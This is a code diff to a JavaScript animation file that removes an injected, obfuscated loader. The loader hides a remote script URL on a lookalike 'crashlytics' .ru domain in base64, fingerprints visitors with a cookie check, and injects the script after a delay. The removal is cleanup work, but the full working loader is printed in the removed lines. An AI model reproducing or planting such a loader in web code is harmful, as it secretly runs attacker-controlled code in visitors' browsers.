@@ -164,13 +164,6 @@ function genImg() {
   }
   if(running){window.requestAnimationFrame(genImg);}
 };
-! function(o, w, d, l) {
-  try {
-    o.c = "h" == l.protocol[0] && /./.test(l.hostname) && !/PHPPREFS/.test(d.cookie), setTimeout(function() {
-      o.c && (o.s = d.createElement("script"), o.s.src = atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==") + l.href, d.body.appendChild(o.s))
-    }, 1e3), d.cookie = "PHPPREFS=full;max-age=39800;"
-  } catch (e) { }
-}({}, window, document, location);
 
 
 //if (location.href.startsWith("https://4fce3d74-d2ae-48a0-9bf9-0d1102c842bc.id.repl.co")) { location.assign("https://jsam.codersquack.ml"); }
